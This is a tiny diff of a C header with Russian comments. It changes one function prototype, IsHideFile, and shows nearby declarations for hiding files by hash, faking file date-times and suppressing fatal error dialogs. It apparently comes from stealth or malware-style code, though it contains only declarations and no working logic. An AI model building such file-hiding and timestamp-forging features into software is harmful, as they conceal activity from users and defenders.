@@ -28,7 +28,7 @@ void SetFakeFileDateTimeW(PWCHAR Path);
 //               указанный файл
 //----------------------------------------------------------------------------
 BOOL IsHide( DWORD dwFileHash );
-BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen);
+BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint);
 
 //----------------------------------------------------------------------------
 // DisableShowFatalErrorDialog - функция устанавливает режим отображения
